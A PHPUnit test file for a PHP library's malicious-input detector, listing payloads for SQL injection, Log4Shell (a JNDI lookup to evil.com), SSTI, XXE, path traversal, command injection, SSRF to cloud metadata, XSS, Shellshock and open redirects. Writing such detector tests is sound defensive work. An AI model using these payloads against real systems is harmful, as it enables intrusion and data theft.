<?php

declare(strict_types=1);

namespace Anonympins\Fingerprint\Tests;

use Anonympins\Fingerprint\Utils\MaliciousPatterns;
use PHPUnit\Framework\TestCase;

class MaliciousPatternsTest extends TestCase
{
    /**
     * @dataProvider maliciousProvider
     */
    public function testIsMaliciousDetectsThreats(string $payload, bool $expected): void
    {
        $this->assertSame($expected, MaliciousPatterns::isMalicious($payload));
    }

    /**
     * @dataProvider openRedirectProvider
     */
    public function testIsMaliciousDetectsOpenRedirect(string $payload, bool $expected): void
    {
        $this->assertSame($expected, MaliciousPatterns::isMalicious($payload, ['openRedirect']));
    }

    public function maliciousProvider(): array
    {
        return [
            // SQL Injections
            ["' OR '1'='1", true],
            ["UNION SELECT username, password FROM users", true],
            ["normal text with no SQL", false],

            // Log4Shell
            ['${jndi:ldap://evil.com/a}', true],
            ['normal log ${user.name}', false],

            // SSTI
            ['{{ 7*7 }}', true],
            ['{% if user.isAdmin %}', true],
            ['simple {braces}', false],

            // XXE
            ['<!ENTITY xxe SYSTEM "file:///etc/passwd">', true],
            ['<!DOCTYPE html>', false],

            // Path Traversal
            ['../../etc/passwd', true],
            ['..\\..\\win.ini', true],
            ['normal/path/to/file', false],

            // RCE
            ['`whoami`', true],
            ['; ping -c 4 8.8.8.8', true],
            ['normal ping command desc', false],

            // SSRF
            ['http://127.0.0.1/admin', true],
            ['https://localhost:8443', true],
            ['http://169.254.169.254/latest/meta-data', true],
            ['https://google.com', false],

            // CRLF
            ["test\r\nHeader: value", true],
            ["%0d%0aHeader: value", true],
            ["clean string", false],

            // XSS
            ['<script>alert(1)</script>', true],
            ['javascript:alert(1)', true],
            ['<img src=x onerror=alert(1)>', true],
            ['<b>bold text</b>', false],

            // LFI/RFI
            ['etc/passwd', true],
            ['win.ini', true],
            ['php://filter/resource=index.php', true],
            ['normal_file.txt', false],

            // Shellshock
            ['() { :; }; echo "Vulnerable"', true],
            ['() { :;};', true],
            ['function test() {}', false],

            // NoSQL Operator Injection
            ['$gt', true],
            ['$elemMatch', true],
            ['$where', true],
            ['This is $10', false],
        ];
    }

    public function openRedirectProvider(): array
    {
        return [
            ['https://evil.com/redirect', true],
            ['//malicious-site.com', true],
            ['/local/path', false],
            ['http://localhost/dashboard', false],
        ];
    }
}